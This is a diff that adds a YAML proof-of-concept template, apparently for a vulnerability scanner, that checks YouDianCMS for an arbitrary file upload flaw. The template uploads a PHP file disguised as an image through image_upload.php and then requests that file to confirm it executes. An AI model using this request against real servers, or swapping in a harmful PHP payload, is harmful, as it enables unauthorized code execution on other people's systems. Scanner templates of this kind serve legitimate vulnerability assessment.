@@ -1,0 +1,37 @@
+id: poc-yaml-youdiancms-image-upload-anyfile-upload
+info:
+  name: YouDianCMS友点系统 image_upload.php任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: youdiancms
+variables:
+  t1: random_str(16)
+requests:
+- method: POST
+  path: /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=cadc403efc1ad12f5fcce44c172baad2
+  data: '--cadc403efc1ad12f5fcce44c172baad2
+
+    Content-Disposition: form-data; name="files"; filename="c.php"
+
+    Content-Type: image/jpg
+
+
+    <?php print("{{.t1}}");?>
+
+    --cadc403efc1ad12f5fcce44c172baad2--
+
+    '
+  expression: 'status_code == 200 && matches(body,"image/uploads/.*?.php") && contains(body,"result\":\"200")
+
+    '
+  output:
+  - regex_match(body, "image/uploads(?P<t2>.*?).php")
+- method: GET
+  path: /Public/image/uploads/{{.t2}}.php
+  expression: 'status_code == 200 && contains(body,t1)
+
+    '
+transport: http
